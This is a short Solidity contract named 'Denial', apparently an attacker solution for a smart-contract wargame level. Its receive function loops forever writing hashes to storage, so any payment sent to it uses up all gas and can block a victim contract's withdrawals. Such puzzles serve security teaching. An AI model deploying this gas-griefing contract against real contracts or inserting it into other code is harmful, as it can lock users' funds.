pragma solidity ^0.8.0;

contract Denial {

  bytes32[] public costlyStructure;

   // allow deposit of funds
    receive() external payable {
        uint j;
        while (true) {
            costlyStructure.push(keccak256(abi.encodePacked(j++)));
        }
    }
}